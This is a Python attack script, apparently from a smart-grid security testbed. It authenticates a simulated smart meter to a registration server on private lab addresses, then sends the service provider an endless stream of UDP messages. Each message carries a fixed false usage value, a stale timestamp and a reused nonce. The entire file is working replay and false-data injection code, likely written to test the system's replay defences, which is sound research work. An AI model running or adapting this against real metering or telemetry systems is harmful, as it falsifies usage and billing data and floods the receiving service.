# replay_attack.py
# Authenticated Replay Attack (SM → SP)

import socket
import json
import time
import os
import sys
import random

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, BASE_DIR)

from crypto.sm import SmartMeter

SP_IP   = "10.0.3.1"
SP_PORT = 9999
REG_PORT = 9998

REPLAY_USAGE  = 2.75
SEND_INTERVAL = 0.5

def run_replay(sm_id):

    # -------- NORMAL AUTH --------
    sm = SmartMeter(sm_id)
    sm.enroll()
    sm.authenticate()

    auth_payload = sm.build_auth_payload(b"AUTH_REQUEST")

    sm_num = int(sm_id[2:])
    reg_ip = "10.0.1.254" if sm_num <= 5 else "10.0.2.254"

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((reg_ip, REG_PORT))
    sock.sendall(json.dumps(auth_payload).encode())
    sock.close()

    print("[✓] Authentication SUCCESS")

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    print("[♻️ AUTHENTICATED REPLAY ATTACK]")
    print(f"SM  : {sm_id}")
    print(f"SP  : {SP_IP}:{SP_PORT}")
    print(f"VAL : {REPLAY_USAGE}")
    print("-" * 40)

    # 🔥 fixed timestamp + nonce
    fixed_ts    = int(time.time())
    fixed_nonce = random.randint(100000, 999999)

    try:
        while True:
            payload = {
                "smId": sm_id,
                "usage": REPLAY_USAGE,
                "proto": "udp",
                "service": "-",
                "timestamp": fixed_ts,     # stale
                "nonce": fixed_nonce       # reused
            }

            sock.sendto(json.dumps(payload).encode(), (SP_IP, SP_PORT))
            time.sleep(SEND_INTERVAL)

    except KeyboardInterrupt:
        print("\n[STOPPED]")
        sock.close()

# ---------------- MAIN ----------------
if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 replay_attack.py <smId>")
        sys.exit(1)

    run_replay(sys.argv[1])
